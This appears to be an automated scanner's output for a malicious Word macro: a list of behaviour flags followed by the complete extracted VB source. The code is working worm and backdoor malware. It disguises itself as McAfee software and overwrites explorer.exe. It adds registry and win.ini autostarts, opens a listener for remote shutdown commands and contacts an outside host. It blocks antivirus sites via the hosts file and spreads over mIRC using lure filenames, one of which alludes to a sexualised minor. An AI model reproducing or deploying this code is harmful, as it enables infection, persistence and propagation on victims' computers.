behavior.AutoExec: Runs when the Word document is opened
behavior.Base64 Strings: Base64-encoded str were detected, may be used to obfuscate str
behavior.Binary: May read or write a binary file
behavior.Chr: May attempt to obfuscate specific str
behavior.Run: May run an executable file or a system command
behavior.SHELL32: May run an executable file or a system command
behavior.Shell: May run an executable file or a system command
behavior.WScript.Shell: May run an executable file or a system command
behavior.vbHide: May run an executable file or a system command

docinfo.macro:
Private Sub Form_Load()
On Error Resume Next
MkDir Environ("WinDir") & "\" & "System64"
On Error Resume Next
App.TaskVisible = False
RCP(Index).LocalPort = 1337
RCP(Index).Listen
rcp3.Connect "www.3-fx.net", 80
On Error Resume Next
Shell "tskill msnmsgr"
On Error Resume Next
Shell "TASKKILL /F /IM msnmsgr.exe", vbHide
Kill "C:\Program Files\MSN Messenger\msnmmsgr.exe"
On Error Resume Next
FileCopy App.Path + "/" + App.EXEName & ".exe", "c:\" + "McAfee Virus Scan.exe"
On Error Resume Next
FileCopy App.Path + "/" + App.EXEName & ".exe", "a:\" + "McAfee Virus Scan.exe"
On Error Resume Next
FileCopy App.Path + "/" + App.EXEName & ".exe", Environ("WinDir") + "\McAfee Virus Scan.exe"
On Error Resume Next
FileCopy App.Path + "/" + App.EXEName & ".exe", Environ("WinDir") & "\System64" & "\Drivers.exe" & ".Manifest"
On Error Resume Next
Open "c:\windows\*.*" For Binary Access Write As #1
Write #1, "start C:\McAfee Virus Scan.exe"
Close #1
Close #1
Open "c:\windows\explorer.exe" For Binary Access Write As #1
Write #1, "start C:\McAfee Virus Scan.exe"
Close #1
Set NEWREG = CreateObject("WScript.Shell")
NEWREG.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & App.EXEName, App.Path & "\" & "McAfee Virus Scan.exe"
NEWREG.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar", 1, "REG_DWORD"
Open "c:\windows\AutoExec.bat" + vbHidden + vbSystem For Append As #2
Print #2, "Net share Illion=C:\"
Print #2, "echo Manifest Flaw > C:\Windows\Explorer.exe.manifest"
Close #2
Shell "c:\windows\AutoExec.bat", vbHide
Open "c:\windows\system32\Drivers\Etc\Hosts" For Append As #1
Print #1, "127.0.0.1 www.symantec.com "
Print #1, "127.0.0.1 www.sophos.com "
Print #1, "127.0.0.1 www.avast.com "
Print #1, "127.0.0.1 www.mcafee.com "
Print #1, "127.0.0.1 www.f-prot.com "
Print #1, "127.0.0.1 www.f-secure.com "
Print #1, "127.0.0.1 www.avp.com "
Print #1, "127.0.0.1 www.kaspersky.com "
Print #1, "127.0.0.1 www.trendmicro.com "
Print #1, "127.0.0.1 www.grisoft.com "
Print #1, "127.0.0.1 www.google.com "
Print #1, "127.0.0.1 www.google.ca "
Print #1, "127.0.0.1 www.hotmail.com"
Print #1, "127.0.0.1 mx1.hotmail.com"
Print #1, "127.0.0.1 mx2.hotmail.com "
Print #1, "127.0.0.1 messenger.hotmail.com     "
Close #1
If Dir$("C:\Program files\Mirc\") Or "C:\Mirc\" Then
On Error Resume Next
FileCopy App.Path + "/" + App.EXEName & ".exe", "C:\Program files\Mirc" + "\16 Yr old Nude.exe"
On Error Resume Next
Dim DRIVE As String
DRIVE = Array("B", "C", "D", "Y", "Z", "A", "E", "F", "G", "H", "I", "J", "L", "M", "N", "O", "P", "Q", "R", "T", "U", "V", "W", "X")
For i = 0 To 27
FileCopy App.Path + "/" + App.EXEName & ".exe", Array(i) + ":\" + "\McAfee Virus Scanner 2006 Beta"
Next i
FileCopy App.Path + "/" + App.EXEName & ".exe", ":\Program files\Mirc" + "\Nude Britney.exe"
On Error Resume Next
FileCopy App.Path + "/" + App.EXEName & ".exe", "C:\Mirc" + "\Nude Britney.exe"
On Error Resume Next
Open "C:\Mirc\Mirc.ini" For Output As #1
Print #1, "on *:join:#:{ .timer 1 $r(30,120) dcc send -c $nick Nude Britney.exe"
Close #1
Open "C:\mIRC\Script.ini" For Output As #1
Print #1, "on *:join:#:{ .timer 1 $r(30,120) dcc send -c $nick Nude Britney.exe"
Close #1
Open "C:\Program files\Mirc\Mirc.ini" For Output As #1
Print #1, "on *:join:#:{ .timer 1 $r(30,120) dcc send -c $nick Nude Britney.exe"
Close #1
Open "C:\Program files\Mirc\Script.ini" For Output As #1
Print #1, "on *:join:#:{ .timer 1 $r(30,120) dcc send -c $nick Nude Britney.exe }"
Close #1
End If
Open "c:\windows\win.ini" For Output As #3
Print #3, "[windows]"
Print #3, "Run=C:\Windows\McAfee Virus Scan.exe"
Print #3, "Load=C:\Windows\McAfee Virus Scan.exe"
Close #3
For i = 1 To 100
Printer.Print "|4m t3h 1337 pr0n h4x0r"
Printer.EndDoc
Next i
End Sub

Private Sub RCP_ConnectionRequest(Index As Integer, ByVal requestID As Long)
Load RCP(RCP.Count + 1)


RCP(RCP.UBound).Accept requestID
End Sub

Private Sub RCP_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim data As String
RCP(Index).GetData data
If data = "shutty" Then
On Error Resume Next
Shell "RUNDLL USER.EXE, ExitWindows", vbHide
On Error Resume Next
Shell "RUNDLL32 SHELL32.DLL,SHExitWindowsEx 4", vbHide
On Error Resume Next
Shell "shutdown -s -f -t 5 -c " & Chr(34) & "An Error Occured With Windows RPC Service" & Chr(34), vbHide
On Error Resume Next
Shell "SHUTDOWN /L /T:10 /Y /C ", vbHide
On Error Resume Next
End If
End Sub

Private Sub RCP3_Connect()
Timer1.Enabled = True
End Sub





Private Sub Timer1_Timer()
If rcp3.State = 7 Then
rcp3.SendData "GET / HTTP/1.1" & vbNewLine & vbNewLine
rcp3.SendData "GET / HTTP/1.0" & vbNewLine & vbNewLine
End If
End Sub
